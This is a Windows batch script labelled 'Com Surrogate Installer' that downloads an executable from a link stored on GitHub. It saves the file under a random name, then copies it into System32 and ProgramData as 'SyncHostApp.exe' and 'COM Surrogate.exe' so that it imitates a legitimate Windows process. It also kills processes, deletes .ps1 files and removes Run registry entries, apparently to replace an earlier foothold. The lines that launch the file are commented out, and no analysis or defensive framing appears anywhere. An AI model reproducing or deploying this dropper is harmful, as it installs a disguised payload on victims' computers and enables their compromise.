:: Com Surrogate Installer
@echo off

setlocal enabledelayedexpansion

color 0A

:loop


set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "filename="




for /L %%i in (1,1,13) do (
    set /A "rand=!random! %% 62"
    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
)

echo.
echo Filename=!filename!.exe
echo.

:DOWNLOADINGAGAIN
echo.
echo.
echo.
echo.


:: Kill & Delete file 
taskkill /f /im !filename!.exe
del /f /q "%TEMP%\!filename!.exe"

for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/ComSurrogateFileLink') do set "COMFILELINK=%%i"

echo.
echo COMFILELINK=%COMFILELINK%
echo.

:: Download the file using curl
curl -L -# -o "%TEMP%\!filename!.exe" "%COMFILELINK%"

timeout /t 2 /nobreak 

:: Checking the existing of the file
if not exist "%TEMP%\!filename!.exe" (
    echo.
    echo The download hasn't started yet. Please check your connection.
	timeout /t 2 /nobreak 
	echo Retrying in 2 seconds ....
	timeout /t 2 /nobreak 
	echo.
	goto DOWNLOADINGAGAIN
)



:: Get the file size in bytes
for %%a in ("%TEMP%\!filename!.exe") do set "FILESIZE=%%~za"



:: Check if the file size is at least 16MB (16000000 bytes)
if %FILESIZE% geq 16000000 (
    rem powershell -NoProfile -WindowStyle Hidden -Command "Start-Process '%TEMP%\!filename!.exe'"
    rem start "" "%TEMP%\!filename!.exe"
) else (
    echo.
    echo Download incomplete. Check your connection and run the file again.
	timeout /t 2 /nobreak 
	echo Retrying in 2 seconds ....
	timeout /t 2 /nobreak 
	echo.
	goto DOWNLOADINGAGAIN
)



taskkill /f /im "COM Surrogate.exe"
taskkill /f /im "SyncHostApp.exe"

del /f /q "%SystemRoot%\System32\SyncHostApp.exe"
del /f /q "%ProgramData%\Microsoft\Windows\COM Surrogate.exe"


if exist "%temp%\!filename!.exe" (
    echo Copying COM Surrogate..
    copy "%TEMP%\!filename!.exe" "%SystemRoot%\System32\SyncHostApp.exe" /y
    copy "%TEMP%\!filename!.exe" "%ProgramData%\Microsoft\Windows\COM Surrogate.exe" /y
)

echo.
echo.
echo.

if not exist "%ProgramData%\Microsoft\Windows\COM Surrogate.exe" (
    goto DOWNLOADINGAGAIN
) else if not exist "%SystemRoot%\System32\SyncHostApp.exe" (
    goto DOWNLOADINGAGAIN
)

echo.
echo.
echo.
echo.



timeout /t 15 /nobreak >nul


:: Delete .ps1 files
del /F /Q /A "%appdata%\*.ps1"

echo.
echo.

:: Delete registry entries
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Powershell /f
reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Steam /f


echo.
echo.


echo COM Installed..
echo.
timeout /t 2 /nobreak

echo.
echo.

